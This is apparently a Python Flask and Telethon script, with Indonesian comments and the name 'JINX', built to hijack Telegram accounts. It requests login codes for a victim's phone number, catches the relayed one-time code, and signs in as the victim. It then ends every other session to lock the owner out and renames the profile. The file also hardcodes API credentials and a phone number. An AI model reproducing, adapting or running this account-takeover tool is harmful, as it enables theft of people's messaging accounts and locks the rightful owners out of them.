from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import events
import os
import json

app = Flask(__name__)

# DATA LO
API_ID = 24289127
API_HASH = 'cd63113435f4997590ee4a308fbf1e2c'
PHONE = '+6285697919996'
SESSION_STRING = os.environ.get('SESSION_STRING')

# Database sementara
DB_FILE = '/tmp/jinx_db.json'

def save_target(phone, hash_code):
    data = {'phone': phone, 'hash': hash_code, 'otp': None}
    with open(DB_FILE, 'w') as f:
        json.dump(data, f)

def update_otp(otp):
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            data = json.load(f)
        data['otp'] = otp
        with open(DB_FILE, 'w') as f:
            json.dump(data, f)
        return data
    return None

# Client utama
client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
client.connect()

# TANGKAP OTP
@client.on(events.NewMessage(chats=PHONE))
async def otp_handler(event):
    if event.message.message.isdigit() and len(event.message.message) == 5:
        otp = event.message.message
        print(f"[JINX] OTP MASUK: {otp}")
        data = update_otp(otp)
        if data:
            await auto_login(data['phone'], data['hash'], otp)

# AUTO LOGIN
async def auto_login(phone, phone_code_hash, otp):
    try:
        target_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await target_client.connect()
        await target_client.sign_in(phone, code=otp, phone_code_hash=phone_code_hash)
        print(f"[JINX] LOGIN SUKSES: {phone}")
        
        # HAPUS SESSION LAIN
        sessions = await target_client(functions.account.GetAuthorizationsRequest())
        for sess in sessions.authorizations:
            if not sess.current:
                await target_client(functions.account.ResetAuthorizationRequest(hash=sess.hash))
        
        await target_client(functions.account.UpdateProfileRequest(first_name="Akun Cadangan"))
        print(f"[JINX] AKUN {phone} AMAN!")
    except Exception as e:
        print(f"[JINX] GAGAL: {e}")

@app.route('/send_code', methods=['POST'])
def send_code():
    phone = request.form.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'no phone'})
    try:
        res = client.send_code_request(phone)
        save_target(phone, res.phone_code_hash)
        return jsonify({'success': True, 'hash': res.phone_code_hash})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/')
def home():
    return "JINX FULL AUTO JALAN! 😈"

from threading import Thread
Thread(target=client.run_until_disconnected).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
